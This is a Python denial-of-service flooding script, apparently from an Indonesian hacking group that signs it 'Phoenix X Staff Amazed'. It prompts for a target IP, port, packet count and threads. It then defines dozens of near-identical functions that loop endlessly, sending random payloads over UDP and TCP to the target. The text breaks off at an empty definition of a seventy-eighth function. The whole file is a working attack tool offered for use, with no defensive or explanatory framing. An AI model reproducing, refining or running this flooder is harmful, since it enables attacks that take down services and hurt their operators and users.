import random
import socket
import threading
import os,sys
os.system("clear")
print("Code By Phoenix")
print("Phoenix X Staff Amazed")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("GAS NIH BRE?(y/n):"))
times = int(input("PACKET:"))
threads = int(input("THREADS:"))
os.system("clear")
def run():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Phoenix And Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            print("Phoenix X Staff Amazed")
            
def run2():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix And Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run3():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run4():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run5():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            print("Phoenix X Staff Amazed")
            
def run6():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run7():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run8():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run9():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            print("Phoenix X Staff Amazed")
            
def run10():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run11():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run12():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run13():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run14():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run15():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run16():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run17():
    data = random._urandom(900)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run18():
    data = random._urandom(1202)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run19():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run20():
    data = random._urandom(811)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run21():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run22():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run23():
    data = random._urandom(1050)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run24():
    data = random._urandom(818)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run25():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run26():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run27():
    data = random._urandom(577)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run28():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run29():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run30():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run31():
    data = random._urandom(3016)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run32():
    data = random._urandom(1180)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run33():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run34():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run35():
    data = random._urandom(487)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run36():
    data = random._urandom(999)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run37():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run38():
    data = random._urandom(818)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run39():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run40():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run41():
    data = random._urandom(818)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run42():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run43():
    data = random._urandom(811)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run44():
    data = random._urandom(1420)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run45():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run46():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run47():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run48():
    data = random._urandom(1025)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run49():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run50():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run51():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run52():
    data = random._urandom(1180)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run53():
    data = random._urandom(1202)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run54():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run55():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run56():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run57():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run58():
    data = random._urandom(1050)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run59():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run60():
    data = random._urandom(1818)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run61():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run62():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run63():
    data = random._urandom(1025)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run64():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run65():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run66():
    data = random._urandom(1180)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run67():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run68():
    data = random._urandom(1025)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run69():
    data = random._urandom(577)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run70():
    data = random._urandom(999)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run71():
    data = random._urandom(1818)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run72():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run73():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run74():
    data = random._urandom(1025)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run75():
    data = random._urandom(17)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run76():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")
            
def run77():
    data = random._urandom(1180)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Phoenix X Staff Amazed Menyenggol Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("Phoenix X Staff Amazed")

def run78():
